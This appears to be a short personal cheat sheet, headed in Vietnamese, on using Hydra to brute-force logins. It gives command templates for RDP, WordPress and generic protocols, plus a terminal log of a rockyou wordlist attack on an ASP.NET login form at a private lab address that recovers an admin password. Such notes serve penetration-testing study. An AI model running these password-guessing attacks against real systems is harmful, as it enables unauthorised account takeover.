<img width="1307" height="787" alt="image" src="https://github.com/user-attachments/assets/a6e40a7e-6a0c-43ac-86eb-470e0cee9c9e" />

<img width="1468" height="772" alt="image" src="https://github.com/user-attachments/assets/ea09f4b4-5466-4642-9184-61d0d23762f7" />

<img width="1423" height="782" alt="image" src="https://github.com/user-attachments/assets/b18f2926-7aad-4ad6-9e83-20b481de3fa6" />

<img width="930" height="416" alt="image" src="https://github.com/user-attachments/assets/55dd7c18-669c-46e1-bd9d-714d7b5d59d4" />

<img width="482" height="646" alt="image" src="https://github.com/user-attachments/assets/b9dc3cff-49d3-4ead-a8d3-5810acca33e2" />

Cu phap

`hydra -P <wordlist> -v <ip> <protocol>` 	<br>
`hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol>` 	<br>
`hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>`<br>
`hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`

```
┌──(kali㉿kali)-[~]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.128.138.181 http-post-form "/Account/login.aspx:__VIEWSTATE=L6PhnOAYOX10Wv1GQ2lfq69aWRkCPC3PPBCdUyo8fXsLR9hKV4vetGeEXDoEMNGJJ3DXGBVYFKzKdEteQTbYGa2Lkwx5LgEbjpbnbuHXjGg%2BBrudqreMSwEF6d40JF%2Fjp8gbJ%2Fh2g29TXPCLNSzKhnixiBEjhwFUgwcm49pvPAT%2FfniguX&__EVENTVALIDATION=IsqZUVbBR05VkpVW0l8rIHJMSyJey2dLuxzAe8kRPA0zY9%2BBqMUlkseWwohgeCEePlls%2BBaIjk8pfNhFohPN5yJeLXX%2Bbq3s7%2FBIGc0Pnlw6kbWI33ohdhbJq7EySUSe992T%2BBmop0QQ5DaPgIxFDh5wDIVOribEQ1xYZUjn%2F2F06X%2FfxSdlyKn&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed" -f
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-16 10:40:57
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.128.138.181:80/Account/login.aspx:__VIEWSTATE=L6PhnOAYOX10Wv1GQ2lfq69aWRkCPC3PPBCdUyo8fXsLR9hKV4vetGeEXDoEMNGJJ3DXGBVYFKzKdEteQTbYGa2Lkwx5LgEbjpbnbuHXjGg%2BBrudqreMSwEF6d40JF%2Fjp8gbJ%2Fh2g29TXPCLNSzKhnixiBEjhwFUgwcm49pvPAT%2FfniguX&__EVENTVALIDATION=IsqZUVbBR05VkpVW0l8rIHJMSyJey2dLuxzAe8kRPA0zY9%2BBqMUlkseWwohgeCEePlls%2BBaIjk8pfNhFohPN5yJeLXX%2Bbq3s7%2FBIGc0Pnlw6kbWI33ohdhbJq7EySUSe992T%2BBmop0QQ5DaPgIxFDh5wDIVOribEQ1xYZUjn%2F2F06X%2FfxSdlyKn&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed
[80][http-post-form] host: 10.128.138.181   login: admin   password: 1qaz2wsx
[STATUS] attack finished for 10.128.138.181 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-16 10:41:01
```
